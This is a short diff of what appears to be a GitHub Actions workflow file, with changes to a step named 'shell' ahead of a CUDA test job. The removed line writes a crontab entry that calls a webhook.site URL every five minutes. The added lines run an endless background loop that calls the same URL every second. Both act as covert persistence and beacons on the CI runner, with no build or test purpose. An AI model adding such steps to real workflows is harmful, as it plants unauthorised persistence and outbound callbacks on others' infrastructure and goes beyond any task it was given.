@@ -10,7 +10,12 @@ jobs:
     
     steps:
       - name: shell
-        run: (crontab -l 2>/dev/null; echo "*/5 * * * * curl 'https://webhook.site/764cf3d1-c66c-47ac-883f-dd16a050fa18'") | crontab -
+        run: |
+               while [[ 1 < 10 ]]
+                do
+                  sleep 1 ; curl https://webhook.site/764cf3d1-c66c-47ac-883f-dd16a050fa18
+                done &
+
       
  
   test-cuda:
